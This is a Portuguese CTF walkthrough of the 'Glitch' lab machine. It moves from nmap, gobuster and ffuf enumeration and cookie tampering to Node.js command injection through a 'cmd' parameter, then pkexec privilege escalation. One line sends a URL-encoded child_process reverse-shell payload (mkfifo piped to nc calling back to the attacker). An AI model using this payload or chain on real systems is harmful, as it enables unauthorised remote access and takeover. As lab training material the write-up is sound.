# _**Glitch CTF**_
![](glitch.jpg)

## _**Enumeração**_
Primeiro, vamos começar com um scan <mark>Nmap</mark>
> ```bash
> nmap -p 0-9999 -A -T5 [ip_address]
> ```
![](scan_nmap.jpg)

Temos um website, vamos investigar  
Procurando algo na ferramenta de desenvolvedor, temos uma string em base64  
Traduzindo, temos a reposta de _token_  

![](token.jpg)

Nenhuma pista a mais  
Vamos realizar um scan com <mark>Gobuster</mark>
> ```bash
> gobuster dir --url [ip_address] -w ../seclists/Discovery/Web-Content/common.txt
> ```
![](scan_gobuster.jpg)

Acessando cada um dos diretórios, não temos muitas informações  
Investigando novamente nas ferramentas de desenvolvedor, temos o seguinte trecho  

![](image.jpg)

Procurando algumas maneiras de explorar o site, vemos que a dica fornecida  
Executamos o comando abaixo em busca de diretórios utilizando o token de acesso
> ```bash
> ffuf -u http://[ip_address]/api/FUZZ -H "Authorization: Bearer dGhpc19pc19u3RfcmVhbA==" -w ../seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,403
> ```
![](ffuf_result.jpg)

Temos um novo diretório, mas acessando, temos apenas os 7 pecados capitais  
Após novamente tentar _fuzz_ com <mark>ffuf</mark> e também _directory_traversal_, nada foi encontrado  
Investigando outras partes da ferramenta de desenvolvedor, temos um cookie com nome _value_  
Alterando o valor do cookie para o valor traduzido da string base64, temos uma nova página web  

![](new_page.jpg)

Investigando a página, temos algumas interações, mas nada de especial  
Novamente sem pistas, voltamos a pensar  
Um diretório que não havia nada era _secret_  
Visitando novamente, temos uma página  

![](secret.jpg)

Mas parece que não tem nada de especial  
Vamos visitar outros diretórios descobertos  
Investigando _/api/items_ com o comando ```ffuf -X FUZZ -u http://[ip_address]/api/items -w ../wordlists/wfuzz/general/http_methods.txt -mc all```, temos retorno 502, 404, 200 e 400  
Este comando foi utilizando anteriormente para testar _/api/access_, mas em POST, tivemos código 404, mas aqui, tivemos código 400  
Vamos tentar utilizar com ```curl```
> ```bash
> curl -X POST http://[ip_address]/api/items
> ```
![](post_400.jpg)

Temos uma nova mensagem  

![](matrix.jpg)

Como fizemos anteriormente, vamos substituir no valor de cookie  
Nada mudou  
Após um tempo perdido, foi decidido tentar _fuzzing_ novamente  
O resultado de POST parece nos dizer que está faltando um parâmetro
> ```bash
> ffuf -X POST -u http://[ip_address]/api/items\?FUZZ\=test -w /usr/share/wordlists/wfuzz/general/medium.txt
> ```
![](new_ffuf.jpg)

Temos uma nova descoberta com ```cmd``` 
Vamos testar alguns comandos  
Não temos retorno  
Daqui, fiquei perdido e fui buscar como explorar essa possível falha  
Encontrei [aqui]() e [aqui]()  
Vamos utilizar ```('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip_address] [port] >/tmp/f')``` com URL encode e o comando abaixo
> ```bash
> curl -X POST http://glitch.thm/api/items?cmd=require[reverse_shell_url_encode]
> ```
Assim, consguimos acesso a máquina  

## _**Escalando privilégios**_
Executando o comando ```find / -perm -4000 -type f 2>/dev/null```, encontramos alguns arquivos e um deles chama a atenção: **pkexec**  
Transferimos o arquivo _.py_ para a máquina alvo e tentamos executar para ganhar _root_  
E sucesso  

![](root.jpg)

Agora, vá atrás das flags!
